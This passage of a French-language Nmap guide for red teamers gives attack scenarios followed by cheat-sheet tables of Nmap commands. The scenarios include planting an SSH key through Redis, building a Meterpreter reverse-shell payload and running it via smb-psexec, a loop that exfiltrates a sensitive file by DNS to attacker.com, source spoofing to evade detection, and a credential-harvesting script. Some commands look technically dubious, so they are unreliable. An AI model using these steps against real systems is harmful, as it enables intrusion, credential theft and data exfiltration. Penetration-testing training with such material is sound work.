   `nmap -p6379 --script redis-brute --script-args redis-brute.username=default,redis-brute.passlist=/chemin/vers/wordlist`
   o Si l'authentification est contournée:
   ```
   local socket = nmap.new_socket()
   socket:connect("10.0.0.5", 6379)
   socket:send("CONFIG SET dir /var/lib/redis/.ssh/\r\n")
   socket:send("CONFIG SET dbfilename authorized_keys\r\n")
   socket:send("SET payload \"ssh-rsa AAAAB3N...\"\r\n")
   socket:send("SAVE\r\n")
   ```

Point Clé:
* Utilisez le script NSE redis-brute pour la pulvérisation d'identifiants. Vérifiez toujours les permissions dir pour l'exécution de code.

### 5.3 SCÉNARIO 3: MOUVEMENT LATÉRAL VIA DES VULNÉRABILITÉS SMB

Objectif: Élever les privilèges et pivoter à travers un domaine Windows en utilisant EternalBlue (MS17-010).

Défi:
* Les hôtes internes sont patchés, mais des systèmes hérités restent non patchés.

Approche Technique:
1. Identifier les Hôtes Vulnérables:
   `nmap -p445 --script smb-vuln-ms17-010 10.10.1.0/24`
   o Recherchez le statut VULNERABLE dans la sortie du script.

2. Livrer la Charge Utile via l'Intégration Nmap + Metasploit:
   Générez une charge utile étagée et déclenchez-la via Nmap:
   `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.2 LPORT=4444 -f exe -o exploit.exe`
   Utilisez Nmap pour charger et exécuter:
   `nmap -p445 --script smb-psexec --script-args smbusername=admin,smbpass=Passw0rd!,smbdomain=corp,config=exploit.exe 10.10.1.50`

Point Clé:
* Combinez la détection de vulnérabilité de Nmap avec Metasploit/Cobalt Strike pour l'armement.

### 5.4 SCÉNARIO 4: EXFILTRATION DE DONNÉES VIA TUNNELING DNS

Objectif: Exfiltrer des données volées d'un réseau isolé en utilisant des requêtes DNS.

Défi:
* Le trafic de sortie est limité à DNS (UDP 53).

Approche Technique:
1. Identifier les Résolveurs DNS Permissifs:
   `nmap -sU -p53 --script dns-recursion <target>`
   o Recherchez recursion enabled: YES.

2. Encoder et Exfiltrer des Données:
   Utilisez le chunking base64 et les requêtes DNS TXT:
   `cat sensitive.txt | base64 | while read chunk; do nmap -sU -p53 --script dns-query --script-args dns-query.name="$chunk.attacker.com",dns-query.type=TXT <dns_server>; done`

Point Clé:
* Utilisez --script dns-query pour tester le canal caché. Surveillez les volumes anormaux d'enregistrements TXT.

### 5.5 SCÉNARIO 5: ÉVITER L'ANALYSE DE TRAFIC RÉSEAU

Objectif: Effectuer un scan furtif sans déclencher d'alertes SIEM.

Défi:
* Le trafic réseau est analysé pour les modèles de scan (par exemple, sondes de port séquentielles rapides).

Approche Technique:
1. Randomiser l'Ordre de Scan et le Timing:
   `nmap -sS -iR 1000 --randomize-hosts -T paranoid --scan-delay 30s -p-`
   o -iR 1000: Scan d'hôtes Internet aléatoires comme trafic de couverture.
   o --scan-delay 30s: Ralentit les sondes pour se mélanger au trafic légitime.

2. Usurper les Adresses MAC/IP Source:
   `nmap -e eth1 --spoof-mac 0A:1B:2C:3D:4E:5F -S 192.168.50.100 -p443 <target>`
   o Utilisez une NIC jetable (eth1) et une IP/MAC jetable.

Point Clé:
* Utilisez --spoof-mac et -T paranoid pour les environnements à enjeux élevés.

### 5.6 SCÉNARIO 6: RÉCOLTE D'IDENTIFIANTS POST-EXPLOITATION

Objectif: Extraire les identifiants d'un hôte Linux compromis.

Approche Technique:
1. Rechercher les Clés SSH et les Fichiers de Configuration:
   `nmap -p22 --script ssh-publickey-acquisition --script-args ssh.usernames='root,ubuntu' <target>`
   o Acquiert les clés publiques/privées pour le mouvement latéral.

2. Extraire les Mots de Passe de la Mémoire:
   Utilisez linux-ssh-hunter (script NSE personnalisé) pour scanner la mémoire du processus:
   ```
   description = "Recherche /proc/*/environ pour les identifiants SSH"
   action = function(host, port)
       local creds = {}
       local procs = assert(io.popen("find /proc -maxdepth 1 -name '[0-9]*'"))
       for pid in procs:lines() do
           local f = io.open(pid .. "/environ", "rb")
           if f then
               local data = f:read("*a")
               if data:match("SSH_AUTH_SOCK") then
                   table.insert(creds, data)
               end
           end
       end
       return stdnse.format_output(true, creds)
   end
   ```

Point Clé:
* Les scripts NSE personnalisés peuvent automatiser les flux de travail post-exploitation sans déposer d'outils sur le disque.

## 6. AIDE-MÉMOIRE NMAP

### 6.1. BASES

| Commande Nmap | Description |
|------------------|----------------|
| nmap <target> | Scan d'une Cible Unique: Effectue un scan basique sur la cible spécifiée (adresse IP ou nom d'hôte). |
| nmap <target1> <target2> | Scan de Multiples Cibles: Scanne plusieurs cibles spécifiées. |
| nmap 192.168.1.1-50 | Scan d'une Plage d'IPs: Scanne les adresses IP de 192.168.1.1 à 192.168.1.50. |
| nmap 192.168.1.0/24 | Scan d'un Sous-réseau Entier: Scanne toutes les 256 adresses IP dans le sous-réseau 192.168.1.0. |
| nmap -p 22,80,443 <target> | Scan de Ports Spécifiques: Vérifie si les ports 22, 80 et 443 sont ouverts sur la cible. |
| nmap -p- <target> | Scan de Tous les Ports: Scanne tous les 65 535 ports TCP sur la cible. |
| nmap -F <target> | Scan Rapide: Scanne rapidement les 100 ports les plus courants. |
| nmap -sP <target> | Scan Ping: Identifie quels hôtes sont actifs sans scanner les ports. |
| nmap -sS <target> | Scan SYN: Effectue un scan TCP SYN furtif. |
| nmap -sU <target> | Scan UDP: Scanne pour les ports UDP ouverts. |
| nmap -A <target> | Scan Agressif: Active la détection de système d'exploitation, la détection de version, le scan de script et traceroute. |
| nmap -O <target> | Détection de Système d'Exploitation: Tente de déterminer le système d'exploitation de la cible. |
| nmap -v <target> | Sortie Verbeuse: Fournit des informations détaillées de scan pendant l'exécution. |
| nmap -oN output.txt <target> | Sauvegarde la Sortie dans un Fichier: Sauvegarde les résultats du scan dans un format normal dans 'output.txt'. |
| nmap --open <target> | Affiche Uniquement les Ports Ouverts: Affiche uniquement les ports ouverts dans les résultats du scan. |
| nmap -iL targets.txt | Scan à partir d'une Liste: Lit les cibles à partir du fichier spécifié 'targets.txt'. |
| nmap -p 1-65535 <target> | Scan de Tous les Ports: Scanne tous les ports de 1 à 65535 sur la cible. |
| nmap -p U:53,T:22,80 <target> | Scan de Ports TCP et UDP Spécifiques: Scanne le port UDP 53 et les ports TCP 22 et 80. |
| nmap -6 <target> | Scan IPv6: Scanne une cible IPv6. |
| nmap -sL <target> | Scan de Liste: Liste les cibles sans envoyer de paquets. |
| nmap --top-ports 20 <target> | Scan des Ports les Plus Courants: Scanne les 20 ports les plus courants. |
| nmap --version | Affiche la Version de Nmap: Affiche la version de Nmap installée. |
| nmap -h | Aide: Affiche le menu d'aide avec toutes les options et descriptions. |

### 6.2. AVANCÉ

| Commande Nmap | Description de la Commande Nmap |
|------------------|-----------------------------|
| nmap <target> | Scan basique d'une cible. |
| nmap <target1> <target2> | Scan de plusieurs cibles. |
| nmap 192.168.1.1-50 | Scan d'une plage d'IPs. |
| nmap 192.168.1.0/24 | Scan d'un sous-réseau entier. |
| nmap -p 22,80,443 <target> | Scan de ports spécifiques. |
| nmap -p- <target> | Scan de tous les 65535 ports. |
| nmap -sV <target> | Détecter les versions de service. |
| nmap -O <target> | Détecter le système d'exploitation. |
| nmap -sT <target> | Effectuer un scan de connexion TCP (connexion complète). |
| nmap -sS <target> | Effectuer un scan SYN (scan furtif). |
| nmap -sU <target> | Effectuer un scan UDP. |
| nmap -A <target> | Conduire un scan agressif (inclut la détection du système d'exploitation, la détection de version, le scan de script et traceroute). |
| nmap -Pn <target> | Désactiver la découverte d'hôte (ignorer le ping). |
| nmap -sL <target> | Lister les cibles sans scanner. |
| nmap -sn <target> | Effectuer un scan ping pour déterminer si les hôtes sont actifs. |
| nmap -oN output.txt <target> | Sauvegarder la sortie au format normal. |
| nmap -oX output.xml <target> | Sauvegarder la sortie au format XML. |
| nmap -oG output.gnmap <target> | Sauvegarder la sortie au format grepable. |
| nmap --script <script> <target> | Exécuter un script NSE spécifique. |
| nmap --top-ports <nombre> <target> | Scanner les N ports les plus courants. |
| nmap --script vuln <target> | Exécuter des scripts de détection de vulnérabilité. |
| nmap -6 <target> | Effectuer un scan IPv6. |
| nmap -T4 <target> | Ajuster la vitesse de scan (T0 à T5, T5 étant le plus rapide). |
| nmap --version-all <target> | Effectuer une détection de version détaillée. |
| nmap --traceroute <target> | Effectuer un traceroute pour déterminer le chemin réseau. |
| nmap --script=http-* <target> | Exécuter tous les scripts liés à HTTP. |
| nmap -sC <target> | Exécuter les scripts de catégorie par défaut. |
| nmap --script-timeout <temps> <target> | Définir le délai d'attente pour les scripts. |
| nmap --max-retries <num> <target> | Définir le nombre maximum de tentatives pour les sondes. |
| nmap --scan-delay <temps> <target> | Définir le délai entre les paquets pendant un scan. |
| nmap --data-length <longueur> <target> | Ajouter des données aléatoires aux paquets envoyés. |
| nmap --ttl <valeur> <target> | Définir la valeur TTL (Time-To-Live) pour les paquets. |
| nmap -D <leurres> <target> | Utiliser des leurres pour masquer la source du scan. |
| nmap --spoof-mac <adresse MAC/fournisseur> <target> | Usurper l'adresse MAC de la machine de scan. |
| nmap --exclude <cibles> | Exclure des cibles spécifiques du scan. |
| nmap --exclude-file <fichier> | Exclure les cibles listées dans un fichier. |
| nmap --reason <target> | Afficher les raisons des changements d'état d'hôte ou de port. |
| nmap --defeat-rst-ratelimit <target> | Contourner les mécanismes de limitation de taux RST de la cible. |
| nmap --append-output <target> | Ajouter les résultats du scan à un fichier de sortie existant. |
| nmap --badsum <target> | Envoyer des paquets avec des sommes de contrôle invalides. |
| nmap -sN <target> | Effectuer un scan Null (aucun drapeau défini). |
| nmap -sF <target> | Effectuer un scan FIN (drapeau FIN défini). |
| nmap -sX <target> | Effectuer un scan Xmas (drapeaux FIN, PSH et URG définis). |
| nmap --script=ftp-anon <target> | Vérifier la connexion FTP anonyme. |
| nmap --script=dns-cache-snoop <target> | Vérifier les vulnérabilités de reniflage de cache DNS. |
| nmap --script=http-stored-xss <target> | Vérifier les vulnérabilités XSS stockées. |
| nmap --script=ssl-enum-ciphers <target> | Énumérer les suites de chiffrement SSL/TLS. |
| nmap --script=http-robots.txt <target> | Récupérer et analyser les fichiers robots.txt. |
| nmap --script=http-sitemap-generator <target> | Générer des plans de site pour les applications web. |
| nmap -PE <target> | Utiliser les requêtes d'écho ICMP pour la découverte d'hôte. |
| nmap -PR <target> | Utiliser les requêtes ARP pour la découverte d'hôte sur les réseaux locaux. |
| nmap --script=http-waf-detect <target> | Détecter les pare-feu d'applications Web. |
| nmap --randomize-hosts <target> | Randomiser l'ordre des hôtes scannés. |
| nmap --min-hostgroup <nombre> <target> | Définir le nombre minimum d'hôtes dans un groupe de scan. |
| nmap --max-hostgroup <nombre> <target> | Définir le nombre maximum d'hôtes dans un groupe de scan. |
| nmap --min-parallelism <nombre> <target> | Définir le nombre minimum de sondes parallèles. |
| nmap --max-parallelism <nombre> <target> | Définir le nombre maximum de sondes parallèles. |
| nmap -sW <target> | Effectuer un scan Window TCP. |
| nmap -sM <target> | Effectuer un scan TCP Maimon. |
| nmap -sZ <target> | Effectuer un scan SCTP COOKIE ECHO. |
| nmap --unprivileged <target> | Exécuter Nmap en mode non privilégié. |
| nmap --send-ip <target> | Utiliser des paquets IP bruts au lieu de protocoles de niveau supérieur. |
| nmap --disable-arp-ping <target> | Désactiver le ping ARP pendant la découverte d'hôte. |
| nmap --ip-options <options> <target> | Utiliser des options IP spécifiques dans les paquets. |
| nmap --script=smb-vuln-ms08-067 <target> | Vérifier les vulnérabilités SMB comme MS08-067. |
| nmap --script=http-sql-injection <target> | Détecter les vulnérabilités d'injection SQL. |
| nmap --script=http-userdir-enum <target> | Énumérer les répertoires utilisateur sur les serveurs HTTP. |
| nmap --script=http-shellshock <target> | Vérifier la vulnérabilité Shellshock. |
| nmap --script=mysql-empty-password <target> | Vérifier les vulnérabilités de mot de passe vide dans MySQL. |

### 6.3. POUR LES RED TEAMERS

| Commande Nmap | Description |
|---------------|-------------|
| nmap -sS -T0 <target> | Scan SYN Furtif avec Timing Lent: Effectue un scan SYN avec le modèle de timing le plus lent pour minimiser la détection. |
| nmap -sN -T0 <target> | Scan Null avec Timing Lent: Envoie des paquets sans aucun drapeau défini, tentant de contourner certains pare-feu et filtres de paquets. |
| nmap -sF -T0 <target> | Scan FIN avec Timing Lent: Envoie des paquets avec seulement le drapeau FIN défini, utile pour évader certains systèmes de détection d'intrusion. |
| nmap -sX -T0 <target> | Scan Xmas avec Timing Lent: Envoie des paquets avec les drapeaux FIN, PSH et URG définis, visant à exploiter des comportements spécifiques de la pile TCP. |
| nmap -sI <zombie_ip> <target> | Scan Idle: Utilise un hôte tiers pour envoyer des paquets, masquant l'adresse IP de l'attaquant. |
| nmap -D RND:10 <target> | Scan Leurre: Génère du trafic à partir de multiples adresses IP usurpées pour obscurcir la vraie source du scan. |
| nmap -f <target> | Scan Fragmentation: Envoie des paquets fragmentés pour évader l'inspection de paquets en divisant la charge utile. |
| nmap --data-length 50 <target> | Longueur de Paquet Personnalisée: Ajoute des données supplémentaires aux paquets pour modifier leur taille, contournant potentiellement les filtres de sécurité. |
| nmap --spoof-mac 00:11:22:33:44:55 <target> | Usurpation d'Adresse MAC: Change l'adresse MAC source du système de scan pour l'adresse spécifiée. |
| nmap --badsum <target> | Scan avec Somme de Contrôle Incorrecte: Envoie des paquets avec des sommes de contrôle incorrectes; les systèmes de pile TCP/IP non conformes peuvent répondre, aidant à la détection. |
| nmap --script firewall-bypass <target> | Script de Contournement de Pare-feu: Tente de détecter et d'exploiter les mauvaises configurations de règles de pare-feu. |
| nmap --script smb-vuln-* <target> | Scripts de Vulnérabilité SMB: Exécute une suite de scripts ciblant les vulnérabilités SMB, comme smb-vuln-ms17-010. |
| nmap --script http-sql-injection <target> | Script d'Injection SQL HTTP: Scanne les vulnérabilités d'injection SQL dans les applications web. |
| nmap --script http-brute <target> | Script de Force Brute HTTP: Effectue un audit de mot de passe par force brute contre l'authentification HTTP. |
| nmap --script ftp-anon,ftp-brute <target> | Scripts FTP Anonyme et de Force Brute: Vérifie l'accès FTP anonyme et tente une connexion par force brute. |
| nmap --script ssh-brute <target> | Script de Force Brute SSH: Tente de deviner les identifiants de connexion SSH par force brute. |
| nmap --script dns-zone-transfer <target> | Script de Transfert de Zone DNS: Tente d'effectuer un transfert de zone DNS pour récupérer tous les enregistrements DNS pour un domaine. |
| nmap --script snmp-brute <target> | Script de Force Brute SNMP: Tente de deviner les chaînes de communauté SNMP par force brute. |
| nmap --script ipidseq <target> | Script de Prédiction de Séquence IPID: Vérifie les séquences IPID prévisibles, qui peuvent être utiles pour les scans idle. |
| nmap --script broadcast-ping <target> | Script de Découverte Réseau: Envoie des pings de diffusion sur un réseau pour découvrir les hôtes actifs. |
| nmap --script vuln <target> | Scan de Vulnérabilité: Exécute une suite de scripts de détection de vulnérabilité contre la cible. |
| nmap --script exploit <target> | Scripts d'Exploitation: Exécute les scripts d'exploitation disponibles contre la cible. |
| nmap --script backdoor <target> | Scripts de Détection de Backdoor: Scanne les backdoors connues sur le système cible. |
| nmap --script malware <target> | Scripts de Détection de Malware: Vérifie les indications d'infections malware sur la cible. |
| nmap --script external <target> | Scripts de Collecte d'Information Externe: Tire parti de sources externes pour rassembler des informations sur la cible. |
| nmap --script discovery <target> | Scripts de Découverte: Exécute des scripts visant à découvrir des informations supplémentaires sur le réseau ou l'hôte. |
| nmap --script intrusive <target> | Scripts Intrusifs: Exécute des scripts qui peuvent être perturbateurs ou causer des interruptions de service; à utiliser avec prudence. |
| nmap --script safe <target> | Scripts Sûrs: Exécute des scripts jugés sûrs et peu susceptibles de causer des perturbations. |
| nmap --script dos <target> | Scripts de Déni de Service: Tente d'identifier ou d'exploiter des vulnérabilités de déni de service; à utiliser avec une extrême prudence. |
| nmap --script auth <target> | Scripts de Contournement d'Authentification: Vérifie les vulnérabilités de contournement d'authentification. |
| nmap --script broadcast <target> | Scripts de Diffusion: Envoie des paquets de diffusion pour découvrir des hôtes et des services sur un réseau. |
| nmap --script brute <target> | Scripts de Force Brute: Effectue un audit de mot de passe par force brute contre divers services. |
| nmap --script default <target> | Scripts par Défaut: Exécute un ensemble basique de scripts considérés utiles pour la reconnaissance générale. |
| nmap --script discovery <target> | Scripts de Découverte: Rassemble des informations sur la cible, comme les ports ouverts et les services. |
| nmap --script dos <target> | Scripts de Déni de Service: Teste les vulnérabilités DoS; peut être perturbateur. |
| nmap --script exploit <target> | Scripts d'Exploitation: Tente d'exploiter des vulnérabilités sur la cible. |
| nmap --script external <target> | Scripts de Collecte d'Information Externe: Utilise des services tiers pour rassembler des informations sur la cible. |
| nmap --script fuzzer <target> | Scripts de Fuzzing: Envoie des données inattendues ou aléatoires aux services pour identifier des vulnérabilités potentielles. |
| nmap --script intrusive <target> | Scripts Intrusifs: Exécute des scripts qui peuvent avoir des effets adverses; à utiliser avec prudence. |
| nmap --script malware <target> | Scripts de Détection de Malware: Vérifie les signes de malware sur le système cible. |
| nmap --script safe <target> | Scripts Sûrs: Exécute des scripts non intrusifs peu susceptibles de causer des dommages. |
| nmap --script version <target> | Scripts de Détection de Version: Détermine les versions de service fonctionnant sur les ports ouverts. |
| nmap --script vuln <target> | Scripts de Détection de Vulnérabilité: Identifie les vulnérabilités connues sur la cible. |
